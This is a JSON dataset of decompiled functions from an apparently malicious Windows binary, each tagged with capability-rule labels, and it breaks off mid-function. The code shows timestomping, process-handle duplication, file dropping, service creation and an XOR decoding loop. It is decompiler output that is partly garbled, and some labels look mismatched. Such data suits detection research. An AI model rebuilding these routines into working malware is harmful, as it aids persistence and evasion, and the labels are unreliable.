{
    "004010d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401185) overlaps instruction at (ram,0x00401184)\n// \n// WARNING: Removing unreachable block (ram,0x00401103)\n\nuint32_t __cdecl\nfcn.004010d0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint filename, \n            uint mode, uint ptr, uint nitems)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    char cVar10;\n    char cVar11;\n    float10 extraout_ST0;\n    float10 fVar12;\n    float10 extraout_ST0_00;\n    uint var_10h;\n    uint var_14h;\n    uchar uStack156;\n    uint uStack155;\n    uint var_80h;\n    uchar uStack124;\n    uint uStack123;\n    uint var_60h;\n    uchar uStack92;\n    uint uStack91;\n    uint var_40h;\n    uchar uStack60;\n    uint uStack59;\n    uchar var_20h;\n    int32_t var_1fh;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = noname_0;\n    uStack24 = 0x4010e3;\n    iVar4 = (*_sym.imp.MSVCRT.dll_fopen)();\n    bVar9 = iVar4 == 0;\n    if (bVar9) {\n        return 0;\n    }\n    bVar8 = false;\n    uStack20 = var_14h;\n    uStack24 = 1;\n    uStack28 = var_10h;\n    stack0xffffffe0 = 0x401118;\n    uVar5 = (*_sym.imp.MSVCRT.dll_fwrite)();\n    if ((!bVar9) && (bVar9)) {\n        if (bVar8 || unaff_EBX + 1 == 0) {\n            while( true ) {\n                iVar4 = fcn.00403950();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                fcn.00404120();\n                iVar4 = fcn.00403520(0x407084);\n                cVar11 = SBORROW4(iVar4, -1);\n                cVar10 = iVar4 + 1 < 0;\n                bVar9 = iVar4 == -1;\n                if (!bVar9) {\n                    return 0;\n                }\n                uVar5 = fcn.00404a90();\n                *0x424500 = 1;\n                if ((bVar9 || cVar11 != cVar10) || (!bVar9 && cVar11 == cVar10)) break;\n                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                uVar2 = uVar5 + in_AF * '\\x06';\n                uVar3 = uVar2 & 0xf;\n                if (extraout_ECX != 0) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                pcVar6 = uVar5 & 0xffff0000 | (CONCAT11((uVar5 >> 8) + in_AF, uVar2) & 0xff0f) & 0xffffff00 | uVar3;\n                *pcVar6 = *pcVar6 + uVar3;\n            }\n            iVar4 = fcn.004044a0();\n            if (iVar4 != 0) {\n                return 0;\n            }\n            uStack60 = 0;\n            uStack156 = 0;\n            puVar7 = &stack0xffffffc5;\n            for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uStack124 = 0;\n            puVar7 = &stack0xffffff65;\n            for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uStack92 = 0;\n            puVar7 = &stack0xffffff85;\n            for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            puVar7 = &stack0xffffffa5;\n            for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uVar5 = fcn.00403710(&stack0xffffff64, &stack0xffffff84, &stack0xffffffc4, &stack0xffffffa4);\n            bVar9 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n            if (uVar5 == 0) {\n                return 0;\n            }\n            if ((bVar9) || (fVar12 = extraout_ST0,  !bVar9)) {\n                uVar5 = fcn.00402710(&stack0xffffffc4);\n                fVar12 = extraout_ST0_00;\n            }\n            pcVar6 = unaff_EBX + -0x3f7afb3b;\n            *pcVar6 = *pcVar6 + uVar5;\n            if (*pcVar6 == '\\0') {\n                return uVar5;\n            }\n            if ((-1 < *pcVar6) && (-1 >= *pcVar6)) {\n                *(puVar7 + 0x1f) = fVar12;\n            }\n            iVar4 = fcn.004012f0(&stack0xffffff64, &stack0xffffff84, &stack0xffffffc4, &stack0xffffffa4);\n            return iVar4 != 0;\n        }\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        piVar1 = (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        iVar4 = iVar4 + 1;\n    }\n    _var_20h = 0x401133;\n    unique0x10000286 = iVar4;\n    (*_sym.imp.MSVCRT.dll_fflush)();\n    uStack20 = 0x401160;\n    (*_sym.imp.MSVCRT.dll_fclose)();\n    return 1;\n}\n",
        "token_count": 1677
    },
    "00401780": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040186c) overlaps instruction at (ram,0x00401869)\n// \n// WARNING: Removing unreachable block (ram,0x0040181f)\n// WARNING: Removing unreachable block (ram,0x00401863)\n\nuint __cdecl fcn.00401780(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char lpBuffer;\n    uint var_22fh;\n    uint var_12ch;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    lpBuffer = '\\0';\n    var_12ch._0_1_ = 0;\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_12ch + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    hFile = arg_ch;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar6 = &lpBuffer;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar3 = 0xffffffff;\n    *(arg_ch + -0x3fcc0037) = *(arg_ch + -0x3fcc0037);\n    pcVar6 = 0x407058;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_12ch;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    if ((arg_ch == -1) && (hFile = fcn.00402f70(arg_8h),  hFile == -1)) {\n        return 0;\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1222
    },
    "004018f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004018f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 88
    },
    "00403000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040306e) overlaps instruction at (ram,0x0040306a)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403112)\n// WARNING: Removing unreachable block (ram,0x00403116)\n// WARNING: Removing unreachable block (ram,0x00403117)\n\nvoid __cdecl\nfcn.00403000(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint *arg_1ch, uint *arg_20h)\n\n{\n    code *pcVar1;\n    uint in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint *extraout_ECX;\n    uint *puVar4;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    uchar uVar9;\n    uchar uVar10;\n    ulong uVar11;\n    unkbyte3 Var12;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar9 = 0;\n    uVar10 = ((in_ECX >> 8 ^ in_EAX >> 8) + 1 & 0x27) == 0;\n    Var12 = arg_18h >> 8;\n    fcn.00401ad0();\n    if ((!uVar10) && (uVar10)) {\n        uVar10 = *0x10 == 0x12f;\n    }\n    uVar11 = fcn.00401ad0(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x18, Var12);\n    iVar5 = uVar11;\n    if ((uVar9 || uVar10) ||\n       (arg_18h = arg_18h & 0xffff00ff,  puVar4 = extraout_ECX,  iVar3 = uVar11 >> 0x20,  !uVar9 && !uVar10)) {\n        puVar4 = arg_20h + 0x28;\n        iVar3 = arg_10h;\n    }\n    *arg_1ch = *arg_20h;\n    uVar6 = arg_18h & 0xffff0000 | CONCAT11(0xdf, arg_18h);\n    *(iVar5 + -4) = 0x8be181d0;\n    *0x8be2225e = *0x8be2225e + puVar4;\n    *(puVar4 + 0x6a) = *(puVar4 + 0x6a) + iVar3;\n    *(iVar3 + 0x57) = *(iVar3 + 0x57) & iVar3;\n    *(iVar5 + -8) = uVar6;\n    *(iVar5 + -0xc) = 0x403082;\n    uVar11 = fcn.00401ad0();\n    *(iVar5 + 0x30) = uVar11;\n    *(iVar5 + 0x2c) = extraout_ECX_00;\n    *(iVar5 + 0x28) = uVar11 >> 0x20;\n    uVar2 = *0x8be181e4;\n    *(iVar5 + 0x30) = arg_20h + 0x39;\n    *(iVar5 + 0x2c) = 0x20;\n    *(iVar5 + 0x28) = uVar2;\n    *(iVar5 + 0x24) = arg_1ch + 1;\n    *(iVar5 + 0x20) = uVar6;\n    *(iVar5 + 0x1c) = 0x4030be;\n    uVar2 = fcn.00401ad0();\n    *(iVar5 + 0x30) = uVar2;\n    *(iVar5 + 0x2c) = uVar6;\n    *(iVar5 + 0x28) = extraout_ECX_01;\n    puVar7 = iVar5 + 0x34;\n    *(iVar5 + 0x30) = 0x4030cf;\n    iVar3 = fcn.00402fb0();\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (iVar3 == -1) {\n        puVar7 = iVar5 + 0x30;\n        *(iVar5 + 0x30) = 0x4030e2;\n        iVar5 = (*pcVar1)();\n        *(arg_20h + 0x49) = iVar5 % 5;\n    }\n    else {\n        *(arg_20h + 0x49) = iVar3;\n    }\n    *0x8be180c4 = 0;\n    puVar4 = 0x8be180c5;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *0x8be181cc = 0x104;\n    *(puVar4 + 2) = 0;\n    *(puVar7 + -4) = 0x8be181cc;\n    *(puVar7 + -8) = 0x8be180c4;\n    *(puVar7 + -0xc) = 0x8be181c8;\n    *(puVar7 + -0x10) = 0x407294;\n    *(puVar7 + -0x14) = 0x407268;\n    *(puVar7 + -0x18) = 0x80000001;\n    *(puVar7 + -0x1c) = 0x40313d;\n    iVar5 = fcn.00401010(*(puVar7 + -0x18), *(puVar7 + -0x14), *(puVar7 + -0x10), *(puVar7 + -0xc), *(puVar7 + -8), \n                         *(puVar7 + -4));\n    if (iVar5 != 0) {\n        *(puVar7 + -4) = iVar5;\n        *(puVar7 + -8) = puVar4 + 3;\n        *(puVar7 + -0xc) = arg_20h + 1;\n        uVar2 = *(puVar7 + -0xc);\n        *(puVar7 + -4) = 0x4072e4;\n        *(puVar7 + -8) = 0x8be180c4;\n        pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n        puVar8 = puVar7 + -0xc;\n        *(puVar7 + -0xc) = 0x403160;\n        uVar11 = (*pcVar1)();\n        if (uVar11 == 0) {\n            puVar8[1] = 0;\n            *puVar8 = uVar11 >> 0x20;\n            puVar8[-1] = uVar2;\n            *(*0x8be181f0 + 0x120) = *(*0x8be181f0 + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 1655
    },
    "00403520": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004035b7) overlaps instruction at (ram,0x004035b3)\n// \n\nuint __cdecl fcn.00403520(uint arg_8h)\n\n{\n    unkbyte10 Var1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    ulong uVar8;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint hObject;\n    \n    hObject = 0xffffffff;\n    iVar4 = (**0x424504)(2, 0);\n    if (iVar4 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar7 = &var_128h;\n    for (iVar5 = 0x49; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    uVar8 = (**0x424508)(iVar4, &var_12ch);\n    pcVar3 = _sym.imp.MSVCRT.dll__stricmp;\n    iVar5 = uVar8;\n    Var1 = extraout_ST0;\n    uVar2 = hObject;\n    while( true ) {\n        hObject = uVar2;\n        if (iVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            return uVar2;\n        }\n        piVar6 = uVar8 >> 0x20;\n        iVar5 = uVar8;\n        if ((-1 < iVar5) && (-1 >= iVar5)) break;\n        iVar5 = (*pcVar3)(&var_108h, arg_8h);\n        if (iVar5 == 0) {\n            if ((iVar5 < 0) || (iVar5 >= 0)) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                arg_8h = var_124h;\n            }\n            else {\n                *pcVar3 = *pcVar3 & 0xc3;\n                (**0xe40ce229)();\n            }\n            return arg_8h;\n        }\n        uVar8 = (**0x42450c)(iVar4, &var_12ch);\n        iVar5 = uVar8;\n        Var1 = extraout_ST0_00;\n        uVar2 = hObject;\n    }\n    *(iVar5 + -0x7ce92414) = Var1;\n    *piVar6 = *piVar6 + -0x7272207c;\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 644
    },
    "00403b10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bb6) overlaps instruction at (ram,0x00403bb5)\n// \n// WARNING: Removing unreachable block (ram,0x00403c92)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403b10(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char unaff_BL;\n    int32_t unaff_EDI;\n    bool bVar6;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    int32_t var_4h;\n    \n    var_4h = fcn.00403520(0x40708c);\n    if (var_4h == -1) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    var_4h = iVar2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar2, 0, 0, 0, 2);\n    uVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n    bVar6 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 == 0) {\n        return 0;\n    }\n    if ((bVar6) || (!bVar6)) {\n        unaff_EDI = iVar2;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    else {\n        piVar1 = iVar2 + -1;\n        *piVar1 = *piVar1 + 0x15;\n        if (*piVar1 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(uVar4, 0x40000000, 1, 0, 2, 0x80, 0);\n            if (iVar2 == -1) {\n                return 0;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, in_stack_00000008, in_stack_0000000c, &var_4h, 0);\n            if (iVar5 != 0) {\n                bVar6 = false;\n                if (*0x4244fc != 0) {\n                    iVar5 = fcn.00403b10(iVar2);\n                    bVar6 = SCARRY4(-(iVar5 != 0), 1);\n                    *0x4244fc = -(iVar5 != 0) + 1;\n                }\n                if (!bVar6) {\n                    if (bVar6) {\n                        LOCK();\n                        iVar2 = 0x138b2633;\n                    }\n                }\n                fcn.00401780(0, iVar2);\n                if (*0x4244fc == 0) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n                }\n                return 1;\n            }\n            return 0;\n        }\n    }\n    *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e) + unaff_BL;\n    return 1;\n}\n",
        "token_count": 743
    },
    "00403bd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403c92)\n\nuint __cdecl fcn.00403bd0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    bool bVar2;\n    uint var_4h;\n    \n    bVar2 = false;\n    *0x4244fc = fcn.00401640();\n    if ((!bVar2) && (bVar2)) {\n        LOCK();\n    }\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &var_4h, 0);\n        if (iVar1 != 0) {\n            bVar2 = false;\n            if (*0x4244fc != 0) {\n                iVar1 = fcn.00403b10(arg_8h_00);\n                bVar2 = SCARRY4(-(iVar1 != 0), 1);\n                *0x4244fc = -(iVar1 != 0) + 1;\n            }\n            if ((!bVar2) && (bVar2)) {\n                LOCK();\n                arg_8h_00 = 0x138b2633;\n            }\n            fcn.00401780(0, arg_8h_00);\n            if (*0x4244fc == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n            }\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 412
    },
    "004044a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004044a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402f70(0x407020);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00401ad0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401b46) overlaps instruction at (ram,0x00401b45)\n// \n// WARNING: Removing unreachable block (ram,0x00401b88)\n// WARNING: Removing unreachable block (ram,0x00401b95)\n// WARNING: Removing unreachable block (ram,0x00401b46)\n\nunkbyte10 __thiscall fcn.00401ad0(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *unaff_EDI;\n    bool bVar6;\n    unkbyte10 in_ST0;\n    int32_t in_stack_00000010;\n    \n    puVar3 = &stack0xfffffffc;\n    bVar6 = false;\n    if (0 < in_stack_00000010) {\n        puVar4 = 0x1;\n        do {\n            if ((bVar6) || (!bVar6)) {\n                in_stack_00000010 = *(puVar3 + 0x10);\n                param_1 = *(puVar3 + -8);\n                puVar5 = puVar4;\n            }\n            else {\n                in_stack_00000010 = in_stack_00000010 + 1;\n                *unaff_EDI = *puVar4;\n                puVar3 = puVar3 + -1;\n                puVar5 = puVar4 + 1;\n            }\n            uVar2 = *(param_1 + in_stack_00000010);\n            puVar3[-1] = *(puVar5 % *(puVar3 + 0xc) + *(puVar3 + 8));\n            unaff_EDI = *(puVar3 + 0x14);\n            param_1 = *(puVar3 + 0x18);\n            uVar1 = unaff_EDI * '\\x02';\n            uVar2 = uVar1 ^ uVar2 ^ *((puVar5 + -1) % *(puVar3 + 0xc) + *(puVar3 + 8));\n            *(param_1 + -1 + puVar5) = uVar2;\n            if ((uVar2 < '\\0') || (uVar2 >= '\\0')) {\n                uVar2 = puVar3[-1];\n            }\n            puVar4 = puVar5 + 2;\n            *(puVar5 + param_1) = uVar1 + 0x2f ^ uVar2;\n            in_stack_00000010 = *(puVar3 + -8) + 1;\n            bVar6 = SBORROW4(in_stack_00000010, unaff_EDI);\n            *(puVar3 + -8) = in_stack_00000010;\n        } while (in_stack_00000010 < unaff_EDI);\n    }\n    return in_ST0;\n}\n",
        "token_count": 644
    },
    "00403860": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403860(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00404a90": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404bd3) overlaps instruction at (ram,0x00404bd0)\n// \n\nuint fcn.00404a90(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    uint uVar6;\n    char extraout_CH;\n    char extraout_CH_00;\n    uint8_t extraout_CH_01;\n    uint8_t extraout_CH_02;\n    int16_t extraout_DX;\n    uint16_t extraout_DX_00;\n    ushort extraout_DX_01;\n    int32_t extraout_EDX;\n    int32_t iVar7;\n    uint16_t unaff_BX;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar8;\n    uint *unaff_EDI;\n    bool bVar9;\n    bool bVar10;\n    ulong uVar11;\n    uint *puStack28;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    uint16_t uStack16;\n    ushort uStack14;\n    \n    bVar9 = false;\n    bVar10 = false;\n    uStack16 = 0x11;\n    uStack14 = 0;\n    uStack20 = 0x7020;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    iVar7 = extraout_EDX;\n    puVar8 = unaff_ESI;\n    if ((!bVar10) && (bVar10)) {\n        puVar8 = unaff_ESI + 1;\n        *unaff_EDI = *unaff_ESI;\n        iVar7 = 0x3c680f6a;\n        unaff_EDI = unaff_EDI + 1;\n        if (bVar9) goto code_r0x00404b0d;\n    }\n    pcVar1 = iVar7 + 0xe;\n    *pcVar1 = *pcVar1 + extraout_CH;\n    bVar9 = (POPCOUNT(*pcVar1) & 1U) == 0;\n    fcn.004039e0();\n    if ((!bVar9) && (bVar9)) {\n        puVar8 = &stack0xffffffd0;\n        cVar3 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *unaff_EBP;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n        uVar6 = in(0x78);\n        return uVar6;\n    }\n    fcn.004039e0(str.h__1, 0xe, 0x40724c);\n    uStack16 = unaff_EDI;\ncode_r0x00404b0d:\n    uVar4 = uStack16;\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack20 = 0x72a0;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x72ac;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    uStack16 = 8;\n    uStack14 = 0;\n    uStack20 = 0x72b8;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    uStack16 = 9;\n    uStack14 = 0;\n    uStack20 = 0x72c0;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    uStack16 = 9;\n    uStack14 = 0;\n    uStack20 = 0x72cc;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    fcn.004039e0();\n    uStack16 = 9;\n    uStack14 = 0;\n    uStack20 = 0x72d8;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    while( true ) {\n        puStack28 = str.h__1;\n        fcn.004039e0();\n        bVar9 = 0xffffffef < &puStack28;\n        uStack16 = 0xc;\n        uStack14 = 0;\n        uStack20 = 0x72e4;\n        uStack18 = 0x40;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        puStack28 = str.h__1;\n        uVar11 = fcn.004039e0();\n        if ((bVar9) || (!bVar9)) break;\n        uStack24 = 0xc08b;\n        uStack22 = 0xb7f8;\n        if (&puStack28 < *uVar11 || uVar11 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        pcVar1 = (uVar11 >> 0x20) + 0xe;\n        *pcVar1 = *pcVar1 + extraout_CH_00;\n    }\n    fcn.004039e0();\n    bVar9 = (unaff_BX & 0xff00 | unaff_BX - 0x12) - extraout_DX < 0;\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack20 = 0x72f4;\n    uStack18 = 0x40;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    puStack28 = str.h__1;\n    uVar11 = fcn.004039e0();\n    if ((bVar9) || ((!bVar9 || (0xff97bf95 < uVar11)))) {\n        puVar2 = (uVar11 >> 0x20) + 0xe;\n        bVar9 = CARRY1(*puVar2, extraout_CH_01);\n        *puVar2 = *puVar2 + extraout_CH_01;\n        bVar10 = *puVar2 == 0;\n        fcn.004039e0();\n        if ((!bVar9 && !bVar10) && 